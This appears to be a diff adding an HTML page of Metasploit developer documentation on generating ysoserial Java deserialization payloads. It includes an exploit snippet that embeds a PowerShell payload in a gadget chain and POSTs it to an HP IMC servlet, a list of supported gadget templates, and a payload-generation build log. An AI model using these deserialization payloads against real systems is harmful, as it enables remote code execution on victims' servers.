@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>Git Reference Sites | Metasploit spike</title>
+<meta name="generator" content="Jekyll v4.0.0" />
+<meta property="og:title" content="Git Reference Sites" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Learning Git" />
+<meta property="og:description" content="Learning Git" />
+<link rel="canonical" href="/metasploit-framework/articles/Git-Reference-Sites.html" />
+<meta property="og:url" content="/metasploit-framework/articles/Git-Reference-Sites.html" />
+<meta property="og:site_name" content="Metasploit spike" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2012-01-12T17:14:28+00:00" />
+<script type="application/ld+json">
+{"description":"Learning Git","headline":"Git Reference Sites","dateModified":"2012-01-12T17:14:28+00:00","datePublished":"2012-01-12T17:14:28+00:00","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"/metasploit-framework/articles/Git-Reference-Sites.html"},"url":"/metasploit-framework/articles/Git-Reference-Sites.html","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/metasploit-framework/assets/main.css"><link type="application/atom+xml" rel="alternate" href="/metasploit-framework/feed.xml" title="Metasploit spike" /></head>
+<body><header class="site-header" role="banner">
+
+    <div class="wrapper"><a class="site-title" rel="author" href="/metasploit-framework/">Metasploit spike</a><nav class="site-nav">
+          <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+          <label for="nav-trigger">
+            <span class="menu-icon">
+              <svg viewBox="0 0 18 15" width="18px" height="15px">
+                <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+              </svg>
+            </span>
+          </label>
+  
+          <div class="trigger">
+            <a class="page-link" href="/metasploit-framework/">Articles</a><a class="page-link" href="/metasploit-framework/modules/">Modules</a></div>
+        </nav></div>
+  </header>
+  <main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Generating `ysoserial` Java serialized objects</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2019-11-27T19:31:17+00:00" itemprop="datePublished">Nov 27, 2019
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p>Instead of embedding static Java serialized objects, Metasploit offers ysoserial-generated binaries with built-in randomization.  The benefits of using the Metasploit library include quicker module development, easier-to-read code, and future-proof Java serialized objects.</p>
+
+<p>To use the ysoserial libraries, let’s look at an example from the <a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/http/hp_imc_java_deserialize.rb"><code class="highlighter-rouge">hp_imc_java_deserialization</code></a> module:</p>
+
+<h3 id="example-code">Example code</h3>
+
+<p>In this example, the module calls <code class="highlighter-rouge">cmd_psh_payload</code> to generate a PowerShell payload, then uses the <code class="highlighter-rouge">ysoserial</code> library to generate a <code class="highlighter-rouge">JSON1</code>-based serialized object, before sending it through an HTTP POST request:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1   def exploit
+2     cmd = cmd_psh_payload(payload.encoded, payload_instance.arch.first, {remove_comspec: true, encode_final_payload: true})
+3     data = ::Msf::Util::JavaDeserialization.ysoserial_payload("JSON1",cmd)
+4
+5     print_status "Sending serialized Java object (#{data.length} bytes)..."
+6     res = send_request_cgi({
+7       'method'   =&gt; 'POST',
+8       'uri'      =&gt; normalize_uri(target_uri.path, 'topo', 'WebDMDebugServlet'),
+9       'data'     =&gt; data
+10    })
+11  end
+</code></pre></div></div>
+
+<p>In line 3, the module uses the <code class="highlighter-rouge">ysoserial_payload</code> function, passing the name of the template and the command to be embedded within the template.  The function returns a Java serialized object, which can then be passed to the vulnerable application.</p>
+
+<h3 id="calling-ysoserial_payload">Calling <code class="highlighter-rouge">ysoserial_payload</code></h3>
+
+<p>The function takes two parameters, a template name and a command:</p>
+
+<ul>
+  <li>
+    <p>The name parameter must be one of the support payloads stored in the <code class="highlighter-rouge">ysoserial</code> cache.  As of this writing, the list includes: <code class="highlighter-rouge">BeanShelll1</code>, <code class="highlighter-rouge">Clogure</code>, <code class="highlighter-rouge">CommonBeanutils1</code>, <code class="highlighter-rouge">CommonsCollections2</code>, <code class="highlighter-rouge">CommonsCollections3</code>, <code class="highlighter-rouge">CommonsCollections4</code>, <code class="highlighter-rouge">CommonsCollections5</code>, <code class="highlighter-rouge">CommonsCollections6</code>, <code class="highlighter-rouge">Groovy1</code>, <code class="highlighter-rouge">Hibernate1</code>, <code class="highlighter-rouge">JBossInterceptors1</code>, <code class="highlighter-rouge">JRMPClient</code>, <code class="highlighter-rouge">JSON1</code>, <code class="highlighter-rouge">JavassistWeld1</code>, <code class="highlighter-rouge">Jdk7u21</code>, <code class="highlighter-rouge">MozillaRhino1</code>, <code class="highlighter-rouge">Myfaces1</code>, <code class="highlighter-rouge">ROME</code>, <code class="highlighter-rouge">Spring1</code>, <code class="highlighter-rouge">Spring2</code>, and <code class="highlighter-rouge">Vaadin1</code>.  While <code class="highlighter-rouge">ysoserial</code> includes 8 other templates that are not listed above, these 8 payloads are unsupported by the library due to the need for complex inputs.  Should there be use cases for those 8 templates, please consider opening an issue and submitting a pull request to add support.</p>
+  </li>
+  <li>
+    <p>The command parameter will be executed by the remote system.  The parameter is OS-agnostic, meaning that the module must determine the OS and architecture, if necessary, before generating a payload.</p>
+  </li>
+</ul>
+
+<h3 id="regenerating-the-ysoserial_payload-json-file-maintainers-only">Regenerating the ysoserial_payload JSON file (MAINTAINERS ONLY)</h3>
+
+<p><strong>Neither module developers nor users need to concern themselves with the following.</strong></p>
+
+<details>
+<summary>Click to expand</summary>
+
+On occasion, Metasploit maintainers may want to re-run the script generation to incorporate new Java serialized objects from the ysoserial tool.
+
+To avoid invoking Java (and all its dependencies) at runtime, the serialized objects are generated and cached within a JSON file.  The JSON file can be refreshed using a standalone Ruby script, which comes prepackaged with a Docker image that handles downloading `ysoserial` and necessary dependencies.  The script, `Dockerimage` and a high-level `runme.sh` script is stored within `tools/payloads/ysoserial`.  An example run looks like:
+
+```
+$ cd ~/git/r7/metasploit-framework/tools/payloads/ysoserial
+$ ./runme.sh 
+Sending build context to Docker daemon  101.8MB
+Step 1/8 : FROM ubuntu
+ ---&gt; cd6d8154f1e1
+Step 2/8 : RUN apt update &amp;&amp; apt -y upgrade
+ ---&gt; Using cache
+ ---&gt; ba7e5691ed5a
+Step 3/8 : RUN apt install -y wget openjdk-8-jre-headless ruby-dev make gcc
+ ---&gt; Using cache
+ ---&gt; d38488663627
+Step 4/8 : RUN wget -q https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar -O ysoserial-original.jar
+ ---&gt; Using cache
+ ---&gt; 284ff722464b
+Step 5/8 : RUN wget -q https://github.com/pimps/ysoserial-modified/raw/master/target/ysoserial-modified.jar
+ ---&gt; Using cache
+ ---&gt; 334c1ccb6fab
+Step 6/8 : RUN gem install --silent diff-lcs json pry
+ ---&gt; Using cache
+ ---&gt; 9d452be9d01f
+Step 7/8 : COPY find_ysoserial_offsets.rb /
+ ---&gt; 61b6f339590c
+Step 8/8 : CMD ruby /find_ysoserial_offsets.rb
+ ---&gt; Running in ba7b14646e56
+Removing intermediate container ba7b14646e56
+ ---&gt; f4ca5ecb6848
+Successfully built f4ca5ecb6848
+Successfully tagged ysoserial-payloads:latest
+Generating payloads for BeanShell1...
+Generating payloads for C3P0...
+    Error while generating or serializing payload
+    java.lang.IllegalArgumentException: Command format is: <base_url>:<classname>
+    	at ysoserial.payloads.C3P0.getObject(C3P0.java:48)
+    	at ysoserial.GeneratePayload.main(GeneratePayload.java:34)
+  ERROR: Errored while generating 'C3P0' and it will not be supported
+Generating payloads for Clojure...
+Generating payloads for CommonsBeanutils1...
+Generating payloads for CommonsCollections1...
+Generating payloads for CommonsCollections2...
+Generating payloads for CommonsCollections3...
+Generating payloads for CommonsCollections4...
+Generating payloads for CommonsCollections5...
+Generating payloads for CommonsCollections6...
+Generating payloads for FileUpload1...
+    Error while generating or serializing payload
+    java.lang.IllegalArgumentException: Unsupported command  []
+    	at ysoserial.payloads.FileUpload1.getObject(FileUpload1.java:71)
+    	at ysoserial.payloads.FileUpload1.getObject(FileUpload1.java:40)
+    	at ysoserial.GeneratePayload.main(GeneratePayload.java:34)
+  ERROR: Errored while generating 'FileUpload1' and it will not be supported
+Generating payloads for Groovy1...
+Generating payloads for Hibernate1...
+Generating payloads for Hibernate2...
+    Error while generating or serializing payload
+    java.sql.SQLException: DataSource name cannot be empty string
+    	at javax.sql.rowset.BaseRowSet.setDataSourceName(BaseRowSet.java:855)
+    	at com.sun.rowset.JdbcRowSetImpl.setDataSourceName(JdbcRowSetImpl.java:4307)
+    	at ysoserial.payloads.Hibernate2.getObject(Hibernate2.java:58)
+    	at ysoserial.GeneratePayload.main(GeneratePayload.java:34)
+  ERROR: Errored while generating 'Hibernate2' and it will not be supported
+Generating payloads for JBossInterceptors1...
+Generating payloads for JRMPClient...
+Generating payloads for JRMPListener...
+    Error while generating or serializing payload
+    java.lang.NumberFormatException: For input string: ""
+    	at java.lang.NumberFormatException.forInputString(NumberFormatException.java:65)
+    	at java.lang.Integer.parseInt(Integer.java:592)
+    	at java.lang.Integer.parseInt(Integer.java:615)
+    	at ysoserial.payloads.JRMPListener.getObject(JRMPListener.java:42)
+    	at ysoserial.payloads.JRMPListener.getObject(JRMPListener.java:34)
+    	at ysoserial.GeneratePayload.main(GeneratePayload.java:34)
+  ERROR: Errored while generating 'JRMPListener' and it will not be supported
+Generating payloads for JSON1...
+Generating payloads for JavassistWeld1...
+Generating payloads for Jdk7u21...
+Generating payloads for Jython1...
+    Error while generating or serializing payload
+    java.lang.IllegalArgumentException: Unsupported command  []
+    	at ysoserial.payloads.Jython1.getObject(Jython1.java:52)
+    	at ysoserial.payloads.Jython1.getObject(Jython1.java:42)
+    	at ysoserial.GeneratePayload.main(GeneratePayload.java:34)
+  ERROR: Errored while generating 'Jython1' and it will not be supported
+Generating payloads for MozillaRhino1...
+Generating payloads for Myfaces1...
+Generating payloads for Myfaces2...
+    Error while generating or serializing payload
+    java.lang.IllegalArgumentException: Command format is: <base_url>:<classname>
+    	at ysoserial.payloads.Myfaces2.getObject(Myfaces2.java:47)
+    	at ysoserial.GeneratePayload.main(GeneratePayload.java:34)
+  ERROR: Errored while generating 'Myfaces2' and it will not be supported
+Generating payloads for ROME...
+Generating payloads for Spring1...
+Generating payloads for Spring2...
+Generating payloads for URLDNS...
+    Error while generating or serializing payload
+    java.net.MalformedURLException: no protocol: 
+    	at java.net.URL.<init>(URL.java:593)
+    	at ysoserial.payloads.URLDNS.getObject(URLDNS.java:56)
+    	at ysoserial.GeneratePayload.main(GeneratePayload.java:34)
+  ERROR: Errored while generating 'URLDNS' and it will not be supported
+Generating payloads for Vaadin1...
+Generating payloads for Wicket1...
+    Error while generating or serializing payload
+    java.lang.IllegalArgumentException: Bad command format.
+    	at ysoserial.payloads.Wicket1.getObject(Wicket1.java:59)
+    	at ysoserial.payloads.Wicket1.getObject(Wicket1.java:49)
+    	at ysoserial.GeneratePayload.main(GeneratePayload.java:34)
+  ERROR: Errored while generating 'Wicket1' and it will not be supported
+DONE!  Successfully generated 0 static payloads and 22 dynamic payloads.  Skipped 8 unsupported payloads.
+```
+
+At completion, the `data/ysoserial_payloads.json` file is overwritten and the 22 dynamic payloads are ready for use within the framework.  Afterward, the developer should follow the standard `git` procedures to `add` and `commit` the new JSON file  before generating a pull request and landing the updated JSON into the framework's `master` branch.
+&lt;/details&gt;
+</init></classname></base_url></classname></base_url></details>
+
+  </div><a class="u-url" href="/metasploit-framework/articles/Generating-%60ysoserial%60-Java-serialized-objects.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/metasploit-framework/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">Metasploit spike</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">Metasploit spike</li><li><a class="u-email" href="mailto:your-email@example.com">your-email@example.com</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/jekyll"><svg class="svg-icon"><use xlink:href="/metasploit-framework/assets/minima-social-icons.svg#github"></use></svg> <span class="username">jekyll</span></a></li><li><a href="https://www.twitter.com/jekyllrb"><svg class="svg-icon"><use xlink:href="/metasploit-framework/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">jekyllrb</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
